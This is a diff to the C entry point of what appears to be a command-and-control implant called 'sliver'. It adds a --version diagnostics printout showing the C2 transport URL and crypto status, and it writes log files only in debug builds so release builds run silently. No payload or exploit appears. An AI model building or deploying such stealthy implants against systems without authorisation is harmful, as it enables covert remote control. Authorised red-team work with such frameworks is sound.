@@ -8,6 +8,13 @@
 #include <stdlib.h>
 #include <string.h>
 
+#if defined(_WIN32)
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+#endif
+
 #include "sliver/config.h"
 #include "sliver/frame.h"
 #include "sliver/log.h"
@@ -489,6 +496,23 @@ static int run_from_build_config(const char *argv0) {
   return sliver_session_run(&cfg) == 0 ? 0 : 1;
 }
 
+static void print_diagnostics(void) {
+  (void)printf("implant   : %s (build %s)\n", sliver_config_name(),
+               sliver_config_build_id());
+  (void)printf("transport : %s\n", sliver_config_c2_count() > 0 ? sliver_config_c2_url(0)
+                                                               : "(none)");
+#if defined(IMPLANT_CRYPTO_ENABLED)
+  (void)printf("crypto    : mbedtls 3.6 + ed25519 + blake2b\n");
+#else
+  (void)printf("crypto    : NOT LINKED (IMPLANT_CRYPTO=OFF)\n");
+#endif
+#if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG
+  (void)printf("build     : debug (console logging enabled)\n");
+#else
+  (void)printf("build     : release (silent)\n");
+#endif
+}
+
 int sliver_cli_main(int argc, char **argv) {
   char err[128];
 
@@ -496,17 +520,36 @@ int sliver_cli_main(int argc, char **argv) {
     (void)fprintf(stderr, "platform init failed\n");
     return 1;
   }
+
+#if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG && defined(_WIN32)
+  /* Debug builds always leave a log file, even when started from Explorer. */
+  {
+    char temp[MAX_PATH];
+    char log_path[MAX_PATH];
+    DWORD n = GetTempPathA(MAX_PATH, temp);
+    if (n > 0 && n < MAX_PATH) {
+      (void)snprintf(log_path, sizeof(log_path), "%ssliver-implant.log", temp);
+      (void)sliver_log_set_file(log_path);
+    }
+  }
+#endif
+
+  /* Diagnostics run before the configuration check so a broken build can be
+   * inspected (`implant.exe --version`). */
+  if (argc > 1 && (strcmp(argv[1], "--version") == 0 || strcmp(argv[1], "-V") == 0)) {
+    print_banner();
+    print_diagnostics();
+    sliver_plat_cleanup();
+    return 0;
+  }
+
   if (sliver_config_self_check(err, sizeof(err)) != 0) {
+    LOG_ERROR("invalid configuration: %s", err);
     (void)fprintf(stderr, "invalid configuration: %s\n", err);
     sliver_plat_cleanup();
     return 2;
   }
 
-  if (argc > 1 && strcmp(argv[1], "--version") == 0) {
-    print_banner();
-    sliver_plat_cleanup();
-    return 0;
-  }
   if (argc > 1 && strcmp(argv[1], "--self-test") == 0) {
     int rc = run_smoke();
     sliver_plat_cleanup();
@@ -567,14 +610,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     char *argv0 = "implant";
     char *argv[1];
     DWORD n = GetTempPathA(MAX_PATH, temp);
-    (void)AttachConsole(ATTACH_PARENT_PROCESS); /* dev: logs appear when run from a shell */
+    (void)AttachConsole(ATTACH_PARENT_PROCESS); /* dev: output appears when run from a shell */
+#if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG
+    /* Only debug builds keep a log file; release builds stay silent. */
     if (n > 0 && n < MAX_PATH) {
       (void)snprintf(log_path, sizeof(log_path), "%ssliver-implant.log", temp);
       (void)sliver_log_set_file(log_path);
     }
+#else
+    (void)log_path;
+    (void)temp;
+#endif
     LOG_INFO("implant starting (gui subsystem, pid %u)", (unsigned)GetCurrentProcessId());
     argv[0] = argv0;
     return sliver_cli_main(1, argv);
   }
 }
 #endif
+
